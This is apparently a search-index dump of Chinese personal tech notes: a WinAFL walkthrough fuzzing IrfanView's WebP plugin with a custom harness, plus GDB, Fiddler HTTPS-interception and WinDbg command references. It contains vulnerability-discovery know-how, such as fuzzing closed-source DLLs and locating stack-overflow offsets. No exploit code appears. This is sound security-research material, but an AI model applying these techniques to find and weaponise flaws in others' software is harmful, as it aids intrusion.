terminal里面无法执行这个命令 afl-fuzz.exe -i in -o out -D \"D:\\dynamorio-master\\dynamorio-master\\Project\\bin32\" -t 20000 -- -coverage_module gdiplus.dll -coverage_module WindowsCodecs.dll -fuzz_iterations 5000 -target_module test_gdiplus.exe -target_offset 0x1680 -nargs 1 -- test_gdiplus.exe @@ 需要注意的是里面的--是分隔符 -o、-i是输出输入目录 -t是超时时间，单位毫秒 coverage_module这是测试的模块，允许有多个 fuzz_iterations是循环的次数，这个会影响exec speed， 一般速度在几百上千是正常的，过慢就说明前处理过程不行 target_module和target_offset是测试的程序，就是要执行的程序，要和最后的相匹配，而且offset一定要是module里的offset，ida可以直接看 -nargs是参数的个数，不包括本身 @@代表参数是自动生成的in里的 最后的结果如下所示 AFL++ afl已经很久没有更新了，但是推出的afl++还在更新，所以可以采用afl++来替代afl。 配置这个环境很简单，直接使用docker就行了，注意设置一个共享目录用来交流文件。 docker pull aflplusplus/aflplusplus docker run -ti -v $HOME:/home aflplusplus/aflplusplus export $HOME=\"/home\" IrfanView案例 首先在官网下载最新版本，然后下载一些他的插件 在这里可以下载插件，可以看到这里还是有不少CVE版本的。 首先先找一下样本库，从github仓库中可以下载，下载之后需要对样本进行一个精简，让 afl自己去根据特征进行删减来提高效率。 寻找偏移 不论干啥都需要先找到处理文件的对应的偏移，可以使用ProcMon来查找 找到处理偏移之后，就可以用winafl自带的工具进行样本筛选 python winafl-cmin.py --working-dir C:\\Users\\moshe\\Desktop\\fuzz\\winafl\\build32\\bin\\Release -w 3 -i C:\\Users\\moshe\\Desktop\\fuzz\\samples -o C:\\Users\\moshe\\Desktop\\fuzz\\irfanview_cmin -t 4000 -D C:\\Users\\moshe\\Desktop\\fuzz\\dynamorio\\build\\bin32 -covtype edge -target_module \"i_view32.exe\" -coverage_module \"i_view32.exe\" -target_offset 0xa54fd -nargs 3 -- C:\\Users\\moshe\\Desktop\\fuzz\\iview457\\i_view32.exe @@ /convert=\"NUL\" /silent 第一个参数是winafl.dll所在的目录 -w是CPU的核心数，提高筛选速度 i/o就是输入和输出目录 -t就是超时时间 -D是DynamoRIO 目录。这与之前执行 drrun 的位置相同.exe covtype： 默认覆盖跟踪器仅跟踪遍历了哪些基本块。Edge还跟踪基本块被命中的顺序。因此，如果您的程序从具有两个独立输入的基本块 A->B->C 和 A->C->B 开始，则基本块跟踪器只会看到一个感兴趣的输入，而边缘跟踪器将同时看到两个输入。 后面就是目标模块和测试模块了 程序参数的个数 后面就是执行的时候的参数 经过筛选完之后就是这个结果 使用drrun验证 这是关键的一步，需要注意的是： 测试程序和winafl一定要在同一个目录下，不然会出现定位不到偏移的问题。比如我测试的是aaa.exe但是主要目标是他的插件bbb.dll这里bbb的位置无所谓，但是exe一定要同目录 一定要注意一定要注意一定要注意一定要注意 可以使用如下命令进行测试，这个文档不是一天写的，所以测试的程序不一样，懒得改了。 D:\\DynamoRIO9.92.19461\\bin32\\drrun.exe -c winafl.dll -debug -target_module calldll.exe - coverage_module test_call.dll -fuzz_iterations 10 -target_offset 0x1590 -- calldll.exe \"123123123456asdf\" 查看覆盖率 利用命令，生成一个log文件，然后利用ida安装的lighthouse插件，在 load生成的log file，就可以明显的看到覆盖率了，但是这里需要注意的是lighthouse已经很久没更新了，所以需要一个旧版本的drrun来测试，查看的结果其实应该基本一样的。如果报错了，就降低drrun的版本，但是编译afl的时候还是用新版本的drrun去编译。然后生成的对应的文件要load进对应文件的ida中，用错了也会报错。 D:\\DynamoRIO-Windows-8.0.18712\\bin32\\drrun.exe -t drcov -- calldll.exe adsfadfadfdasfassdf 12345609876llllllllllllllllll 总结 利用procmon实际上就是进行一个大体的定位，后续用到的drrun就是对具体模块中的代码块进行的定位，可以看到覆盖百分率这些东西，看一下目标模块怎么样就可以了，或者有没有陷入奇怪的代码中。 开始模糊测试 使用经典的winafl命令就可以直接进行测试了，因为这是利用 DynamoRIO 进行的动态插桩，所以不需要编译啥的。 afl-fuzz.exe -i C:\\Users\\moshe\\Desktop\\fuzz\\irfanview_cmin -o C:\\Users\\moshe\\Desktop\\fuzz\\winafl_output -t 1000+ -D C:\\Users\\moshe\\Desktop\\fuzz\\dynamorio\\build\\bin32 -- -coverage_module \"i_view32.exe\" -target_module \"i_view32.exe\" -target_offset 0x082550 -- C:\\Users\\moshe\\Desktop\\fuzz\\iview457\\i_view32.exe @@ /convert=\"NUL\" /silent iotD这些参数都是固定的含义 -- 作为分隔符 target_offset：目标的相对于文件头的偏移 开始测试： 不难发现，全是一堆time out，这显然是不成功的。但是基本的流程清楚了。这是因为他找不到要测试的dll库了，需要手动patch一下目标程序让他可以在本目录中寻找插件dll，否则winafl会报错，winafl不能跨目录 修改一下这里，然后将webp托到同目录就可以了就可以同目录测试了。 -f 这个测试可以指定输入文件的名称，如下所示： afl-fuzz.exe -i in -o out -S s1 -D \"D:\\DynamoRIO9.92.19461\\bin32\" -f test.webp -t 7000 -- -c overage_module WebP.dll -target_module call_webp.exe -target_offset 0x0155c -fuzz_iterations 8000 -nargs 1 -- call_webp.exe @@ 这个输入会根据in目录中的文件变异得到。 提高效率 直接通过原始程序测试会有许多其他路径，降低fuzz的速度，实测峰值在40次每s左右，这里我们可以手动写一个calldll程序来进行fuzz 首先就是要搞清楚dll里某个导出函数的参数，ida可能会出错，所以这里我们要x64dbg和ida联合调试，下面是我写的calldll文件，可以将速度提升到1000次每秒左右，速度非常快，仅供参考：利用下面的程序我们可以只fuzz下面的那个fuzz函数，防止fuzz程序陷入其他无用模块。 #include #include // L\"\\x65E0\\x0000\\x215B\\x54C4\" 2 wchar_t iarg3[520] = { 0 }; wchar_t iarg4[520] = { 0 }; int iarg5[17] = {0}; // typedef void (WINAPI *Readwebp_W)(char *D, wchar_t a2[], wchar_t arg2[] , wchar_t *ini_path, wchar_t* file_path); typedef void (WINAPI *Readwebp_W)(LPCWSTR file_path, LPCWSTR ini_path, wchar_t *arg3, wchar_t *arg4, int *arg5); void fuzz(Readwebp_W readwebp_W, LPCWSTR file_path) { LPCWSTR lpFileName = TEXT(L\"C:\\\\Users\\\\Rootkit\\\\AppData\\\\Roaming\\\\IrfanView\\\\i_view32.ini\"); readwebp_W(file_path, lpFileName, iarg3, iarg4, iarg5); } int main(int argc, char **argv) { HMODULE PDFDLL = LoadLibraryA(\"C:\\\\Users\\\\Rootkit\\\\Desktop\\\\winafl-TEST\\\\IrfanView\\\\webp.dll\"); if(PDFDLL == NULL) { printf(\"call pdf.dll wrong , error code : %d\\n\", GetLastError()); return 0; } Readwebp_W readWebp = (Readwebp_W)GetProcAddress(PDFDLL, \"ReadWebP_W\"); if (readWebp == NULL) { printf(\"GetProcAddress readWebp failed! error code: %d\\n\", GetLastError()); FreeLibrary(PDFDLL); return 1; } int len = strlen(argv[1]); // length of input string // calculate required length of wide byte string (add 1 for null terminator) int wideLen = MultiByteToWideChar(CP_UTF8, 0, argv[1], len, NULL, 0) + 1; printf(\"%d\\n\", wideLen); wideLen = len + 1; // UTF-8 to wide char conversion, assuming all chars are the same (no surrogates printf(\"%d\\n\", wideLen); // allocate memory for wide byte string LPWSTR wideStr = (LPWSTR) malloc(wideLen * sizeof(wchar_t)); // convert narrow byte string to wide byte string MultiByteToWideChar(CP_UTF8, 0, argv[1], len, wideStr, wideLen); // null-terminate the wide byte string wideStr[wideLen - 1] = 0; printf(\"i will call the fuzz func\\n\"); fuzz(readWebp, wideStr); FreeLibrary(PDFDLL); return 0; } 然后通过-M maste和-S s1这些参数来多开进程来提高效率，影响到内存和cpu，每一个进程会独占一个cpu核心，内存也会成波浪式使用，所以要懂得取舍。 实际效果 afl-fuzz.exe -i in -o out -M master -D \"D:\\DynamoRIO9.92.19461\\bin32\" -t 7000 -- -c overage_module WebP.dll -target_module call_webp.exe -target_offset 0x0155c -fuzz_iterations 8000 -nargs 1 -- call_webp.exe @@ afl-fuzz.exe -i in -o out -S s1 -D \"D:\\DynamoRIO9.92.19461\\bin32\" -t 7000 -- -c overage_module WebP.dll -target_module call_webp.exe -target_offset 0x0155c -fuzz_iterations 8000 -nargs 1 -- call_webp.exe @@ afl-fuzz.exe -i in -o out -S s2 -D \"D:\\DynamoRIO9.92.19461\\bin32\" -t 7000 -- -c overage_module WebP.dll -target_module call_webp.exe -target_offset 0x0155c -fuzz_iterations 8000 -nargs 1 -- call_webp.exe @@ afl-fuzz.exe -i in -o out -S s3 -D \"D:\\DynamoRIO9.92.19461\\bin32\" -t 7000 -- -c overage_module WebP.dll -target_module call_webp.exe -target_offset 0x0155c -fuzz_iterations 8000 -nargs 1 -- call_webp.exe @@ 速度相当可观，大概是测试了33小时，当last new path的值长时间不变的时候，就差不多可以停了，我停止的时候他已经4小时没有新路径了，所以就停了，也没有fuzz出crash。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-27 21:17:24 "},"MyArticles/ToolUsage/GDB使用.html":{"url":"MyArticles/ToolUsage/GDB使用.html","title":"GDB使用","keywords":"","body":"因为GDB类似于windbg都是基于命令行的调试器，所以会出现一些指令，记录一下，长时间不用就忘了 GDB原理 GDB调试包括2个程序：gdb程序和被调试程序。根据这2个程序是否运行在同一台电脑中，可以把GDB的调试模型分为2种：本地调试，远程调试。远程调试我没用过 本地调试 就直接在本地进行调试 远程调试 利用gdbserver来进行远程调试 GDB插件 peda $ git clone https://github.com/longld/peda.git ~/peda $ echo \"source ~/peda/peda.py\" >> ~/.gdbinit 这个是最常用的一个，可以结构话的高亮一些代码 gef pwndbg GDB命令 断点 breakpoint：软件断点 hbreakpoint：硬件断点 rwatch：设置读取观察点，实现内存断点 watch：写入时gdb中断 awatch：读写都中断 t前缀：一次性断点 info b：查看断点 enable：激活断点 disable：禁用断点 修改值 set $eax=10：修改寄存器或者内存中的值，利用set命令 查看值 x/ n、f、u是可选的参数。 x /4xg $ebp：查看ebp开始的4个8字节内容 x/wx $esp 　　以4字节16进制显示栈中内容 b表示单字节，h表示双字节，w表示四字 节，g表示八字节 s 按字符串输出 x 按十六进制格式显示变量。 d 按十进制格式显示变量。 u 按十六进制格式显示无符号整型。 o 按八进制格式显示变量。 t 按二进制格式显示变量。 a 按十六进制格式显示变量。 c 按字符格式显示变量。 f 按浮点数格式显示变量。 i：反汇编 heapinfo：查看堆的信息 调式值 r：run开始执行 n：单步步过 s：单步步入 c：继续执行到下一个断点 fini：结束当前函数 context：查看运行上下文 stack 10：显示栈中的10项 bt：查看当前栈帧 启动 checksec：查看程序保护 pattern 100：生成100个随机字符，用于判断栈溢出 pattren offset “str”：用来定位偏移 set args：指定运行时参数 show args：查看设置的运行参数 附加进程 gdb procname pid gdb -p pid gdb attach pid（需要先启动gdb） 调试core文件 gdb procname corename 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-11 22:08:58 "},"MyArticles/ToolUsage/Fiddler学习.html":{"url":"MyArticles/ToolUsage/Fiddler学习.html","title":"Fiddler学习","keywords":"","body":"工作原理 以代理web服务器的形式工作的，它使用代理地址:127.0.0.1，端口:8888。 当Fiddler退出的时候它会自动注销， 这样就不会影响别的程序。不过如果Fiddler非正常退出，这时候因为Fiddler没有自动注销，会造成网页无法访问。 解决的办法是重新启动下Fiddler。 正常退出： Fiddler 汉化包插件任意版本可用 配置 为什么配置 不配置你抓不到包，更解析不到https请求包，那等于没用 配置过程 实质上就是给浏览器安装一个证书（PC端抓包），移动端抓包也一样，安装fiddler的证书 证书生成 工具--->选项 勾选下面的解密https，弹窗选中yes 然后一直选是，之后看到下面的选项，全选之后，点击Actions 选中这个选项，然后就在桌面上生成一个证书 证书导入 将证书导入到浏览器或者是手机目录下 这里用edge为例 选“受信任的根证书######”，然后导入刚刚的证书就可以了。 这时就可以进行抓包了，会自动显示浏览器里的包，但是如果这时发现全是http包，没有https的化，还是回到这个界面 把decrypt https和下面的两个选上，然后点击ok，就可以看到https包了 使用方式 窗口作用 大致可以看作三个模块，左边是会话列表，下面是命令行，右边的上面是客户端请求，下面的服务器响应。 会话列表 Result : HTTP响应的状态 Protocol：请求使用的协议（如HTTP/HTTPS） HOST：请求地址的域名/ip URL：请求的服务器路径和文件名，也包含GET参数 BODY：请求的大小，以byte为单位 Content-Type：请求响应的类型 Caching：请求的缓存过期时间或缓存控制header的值 Process：发出此请求的Windows进程及进程ID Comments ：用户通过脚本或者菜单给此session增加的备注 custom：用户可以通过脚本设置的自定义值 这里直接中英备注，不是所有时候都能拿到中文的fiddler 请求列表 网格视图可以很简单的查看键值关系 响应列表 工具栏的作用基本和请求列表的作用相同，但是这里是服务器的回应。 上图是抓到的itest的响应，可以看到时间等一系列的信息 设置过滤 过滤host 这里找到工具栏的Filters，然后点击使用过滤，写上要接受的host的地址，多个地址的话用分号隔开。 这样fiddler只能抓到指定host的数据包了，但是用完记得取消。 过滤特点URL 抓包很全面，把图片，图标全都抓到了，分析起来很困难，所以设置一下让他直接忽略那些不重要的东西 REGEX:(?insx)/[^\\?&]*\\.(css|ico|jpg|png|gif|bmp|wav|js)(\\?.*)?$ 这里直接正则表达式过滤 如下图进行使用 也可以用 这个功能，删除特定的数据包，方便分析。 最后别忘了点击右上角的Action里的run，不然就白设置了。 断点和重放 两种断点 before response：这个是打在request请求的时候，未到达服务器之前 点一下这个框，变成红色，就是设置了请求断点。拦截了请求包。 after response：也就是服务器响应之后，在Fiddler将响应传回给客户端之前 上述地方再点一下，就变成了响应断点 另一种方式 也可以在这里设置断点。 还可以 bpu https://www.baidu.com/” 回车执行，接下来就会中断URL中包含此地址的请求。 输入bpu进行取消。 修改包内容 断点段下来之后，就可以修改包的内容 这里用itest为例 在断点断下包之后，直接在这个界面就可以修改 这里把history改成false，或者后面改成1，都会看到不同的现象。 同理，下响应断点也可以修改服务器端响应的内容。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2022-05-18 11:41:22 "},"MyArticles/ToolUsage/windbg记录.html":{"url":"MyArticles/ToolUsage/windbg记录.html","title":"windbg使用","keywords":"","body":"记录windbg的常用命令和调试方法，没有中文版，全是英文，比较难受。使用起来类似于Windows上的gdb调试。 窗口设置 windbg初始窗口设置比较单一，无法满足正常的调试需要，所以需要补充几个窗口： 最终结果： 主题比较单一，就一个亮模式一个暗模式。可以从工具栏的view窗口来添加窗口。常用窗口： 寄存器：register 所有的值可以在双击后更改 反汇编：disassemble f9：下断点；f10相当于f8：单步步过；f11相当于f7：单步步进。 shift+f11：运行完当前函数，相当于fini 栈：stack 更加用户友好了，不会很乱 看到左下角有一个locals窗口，这个和vs调试窗口一样，可以显示局部变量。 内存：memory，可以设置多个内存窗口，但是会比较拥挤。 把之前的删了，直接输入地址就可以自动跳转到相关地址，可以实现在内存中转到。 从文件选项中可以载入程序，或者附加进程，或者附加其他的东西，比如内核和远程调试 设置好界面之后，可以将当前的配置进行保存，方便之后一直使用而不用重新设计。 常用命令 1、标准命令 调试 t 或者 F11 ===> 单步，遇到函数跟进（step into） p 或者 F10 单步 ===> 遇到函数跳过（step over） Shift + F11 ===> 跳出当前函数（step out）. 执行：go g [地址|函数名] ===> 持续执行到指定位置的指令 gh[地址|函数名] ===> 持续执行时，如果遇到异常则中断 gn[地址|函数名] ===> 持续执行时，即使遇到异常也忽略 断点：breakpoint 软件 bl ===> 列出已设置的断点。显示结果中，第一列为断点的 ID；第二列为断 点当前状态，‘e’表示断点处于活动状态（enable），‘d’表示断点暂 时被禁用；第三列为断点的位置（breakpoint list） be[断点 ID] ===> 激活断点（breakpoint e nable） bd[断点 ID] ===> 禁用断点（breakpoint disa ble） bc[断点 ID] ===> 清除断点（break point clear） bp[地址|函数名] ===> 设置断点。如不指定地址，则在当前指令上下断点。 注意，这里介绍的是最基础的断点方式，WinDbg 中可以结合地址、函数名、消息等各种条件设置很复杂的断点。此外，bu、bm 等命令也可设置断点. bu ===> 设置一个延迟的以后再求解的断点，用于对尚未加载模块中的代码设置断点。当指定的模块被加载时，WinDBG会真正落实这个断点。所以bu命令对于调试动态加载模块的入口函数或者初始化代码特别有用 bm ===> 用来批量设置断点。比如： 对于msvcr80d模块中的所有print开头的函数设置断点：bm msvcr80d!print* 硬件 WinDBG的ba命令用来设置硬件断点，其格式如下： ba [ID] Access Size [Option] [Address[Passes]] [\"Command String\"] ID用来指定断点序号 Access用来指定触发断点的访问方式 可以为以下几个字母之一 e 读取和执行时触发断点 r 读取和写入时触发断点 w 写入时触发断点 i 有IO操作时触发断点 Size用来指定访问的长度 x86系统可以为1 2 4三种值 Passes参数和CommandString参数的用法与设置软件断点命令中的一样 使用例子： 对内存地址0041717c的一字节访问、字访问、双字访问（读写）都会触发这个断点 ba r1 0x401000 查看硬件寄存器的状态的话要直接去看DR状态寄存器。 数据显示：display d [地址] ===> 显示内存数据。默认情况下按照字节和 ASCII 显示，即等同于 DB 命令。如果修改了显示模式，再次使用时则与最后一次数据显示命令所使用的显示模式相同 db [地址] ===> 按照字节模式显示内存数据（display byte） dd [地址] ===> 按照双字模式显示内存数据（display dword） dD ===> 按双精度浮点数的模式显示内存数据。注意这条命令和前面一条命令是区别大小写的（display Double Float） da ===> 按 ASCII 模式显示（display ASCII） du ===> 按 Unicode 模式显示（display Unicode） ds ===> 按字符串模式显示。注意，在没有‘\\0’作为字符串结束时，不要轻易用这条命令打印内存，否则 WinDbg 会将遇到的第一个 NULL 前的东西都打印出来（display String） dt ===> 套用已知的数据结构模板（structure）显示内存。这个命令很有用，例如，在调试堆时可以直接用这个命令把内存按照堆表的格式显示出来。 r ===> 查看寄存器的值【r rax】 数据编译：edit e [地址][数据] ===> 修改任意内存地址的值 Eb` ===> 以字节形式写入 ed[地址][数据] ===> 以双字形式写入 ea[地址][数据] ===> 以 ASCII 字符形式写入，注意，ASCII 字符串需要加双引号 eu[地址][数据] ===> 以 Unicode 字符形式写入，注意，Unicode 字符串需要加双引号 其他 栈相关 命令 含义 k 显示调用堆栈 kb 显示调用堆栈和栈上的前三个参数 kp 参数和参数值都以函数原型格式显示出来(必须有符号) kv kb命令的基础上增加显示FPO信息和调用约定 kn 命令会在每行前显示栈帧的序号 但是这里显示的参数是 在栈上的 参数，在寄存器里的参数看不到。 搜索 输入命令 s –a 00400000 L53000 “Wrong” 该命令的意思是以ASCII码形式在内存地址00400000往后53000个字节搜索字符串“Wrong”。 s，就是要调用查找的命令 -a，指定使用ASCII码的形式查找 00400000，指定要开始寻找的内存地址。 WinDbg不支持模糊搜索，所以这里输入的字符串必定要完全正确。 没有xdbg那种显示所有字符串的能力 2、元命令 用来提供标准命令没有提供的调试功能，与标准命令一样，元命令也是内建在调试器引擎或者WinDBG程序文件中的。 所有元命令都以一个点（.）开始，所以元命令也被称为点命令。例如 .reload 重新载入符号 .reboot 重启目标机器 .restart 重启调试器 .logfile 显示信息 3、拓展命令 扩展命令用于扩展某一方面的调试功能。与标准命令和元命令是内建在WinDBG程序文件中不同，扩展命令是实现在动态加载的扩展模块（DLL）文件中的。所有的拓展命令用!开头 通过WinDBG的SDK，用户可以编写自己的扩展模块和扩展命令，例如漏洞测试常用的一个mona插件 4、伪寄存器 WinDBG自动定义了很多伪寄存器。在命令行和命令文件中都可以使用伪寄存器。WinDBG会自动将其替换（展开）为合适的值。例如下面这个@$scopeip就是一个伪寄存器，它代表当前的eip指针。 查阅可以得到一些常用的伪寄存器 伪寄存器 含义 $ea 调试目标所执行上一条指令的有效地址 $ea2 调试目标所执行上一条指令的第二个有效地址 $exp 表达式评估器所评估的上一条表达式 $ra 当前函数的返回地址 $eip 指令指针寄存器 $eventip 当前调试事件发生时的指令指针 $previp 上一事件的指令指针 $relip 与当前事件关联的指令指针 $scopeip 当前上下文的指令指针 $exentry 当前进程的入口地址 $retreg 首要的函数返回值寄存器 $retreg64 64位格式的首要函数返回寄存器 $csp 栈顶指针ESP $p 上一个内存显示命令所打印的第一个值 $proc 当前进程EPROCESS结构的指针 $thread 当前线程ETHREAD结构的指针 $peb 当前进程的进程环境块(PEB)的地址 $teb 当前线程的线程环境块(TEB)地址 $tpid 拥有当前线程的进程ID(PID) $tid 当前线程的线程ID $bpx X号断点的地址 $frame 当前栈帧的序号 $dbgtime 当前时间 $callret 使用.call命令调用的上一个函数的返回值 $ptrsize 调试目标所在系统的指针类型宽度 $pagesize 调试目标所在的系统的内存页字节数 软件调试：r3 windbg的灵魂是内核调试和驱动调试以及dump文件分析，但是先用r3来熟悉一下怎么使用。 基本调试 寻找入口点 不像xdbg一样，会自动段在程序入口点，windbg会断在程序初始化的dll库中，而且断的很细致，所以需要手动定位程序入口点： 1、查看载入的所有模块：lm 获得到了载入内存中的要调试程序的baseaddr。 2、查看入口点RVA：!dh -a model_name !dh命令还是用处比较广泛的 0:000> !dh -h Usage: dh [options] address Dumps headers from an image based at address Options: -a Dump everything ;查看所有信息 -f Dump file headers ;查看文件头 -s Dump section headers ;查看节区头 -e Dump exports ;查看导出表 -i Dump imports ;查看导入表 这里其实要获得入口点的话无所谓用哪个命令，因为他在前面的具体程序信息里。 断点 直接base+rva的地址处下一个断点防止跑飞： 执行 直接go到这个地址就可以了。 command界面可以显示汇编，但是比较有限，所以我一般习惯额外开一个disassem界面来观察汇编。 高级调试 模块加载时断点 sx：控制被调试的程序发生某个异常或特定事件时，调试器要采取的动作 0:000> sx ct - Create thread - ignore et - Exit thread - ignore cpr - Create process - ignore epr - Exit process - break ld - Load module - output ud - Unload module - ignore ser - System error - ignore ibp - Initial breakpoint - break iml - Initial module load - break out - Debuggee output - output av - Access violation - break - not handled asrt - Assertion failure - break - not handled aph - Application hang - break - not handled bpe - Break instruction exception - break bpec - Break instruction exception continue - handled eh - C++ EH exception - second-chance break - not handled clr - CLR exception - second-chance break - not handled clrn - CLR notification exception - second-chance break - handled cce - Control-Break exception - break cc - Control-Break exception continue - handled cce - Control-C exception - break cc - Control-C exception continue - handled dm - Data misaligned - break - not handled dbce - Debugger command exception - ignore - handled gp - Guard page violation - break - not handled ii - Illegal instruction - second-chance break - not handled ip - In-page I/O error - break - not handled dz - Integer divide-by-zero - break - not handled iov - Integer overflow - break - not handled ch - Invalid handle - break hc - Invalid handle continue - not handled lsq - Invalid lock sequence - break - not handled isc - Invalid system call - break - not handled 3c - Port disconnected - second-chance break - not handled svh - Service hang - break - not handled sse - Single step exception - break ssec - Single step exception continue - handled sbo - Security check failure or stack buffer overrun - break - not handled sov - Stack overflow - break - not handled vs - Verifier stop - break - not handled vcpp - Visual C++ exception - ignore - handled wkd - Wake debugger - break - not handled rto - Windows Runtime Originate Error - second-chance break - not handled rtt - Windows Runtime Transform Error - second-chance break - not handled wob - WOW64 breakpoint - break - handled wos - WOW64 single step exception - break - handled * - Other exception - second-chance break - not handled sxe：在任何错误处理器被激活之前目标立即中断到调试器中 驱动调试：r0 利用vmware和windbg的联动进行调试，防止本机死机蓝屏。但是我还不会，等用到再说 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-28 19:17:06 "}}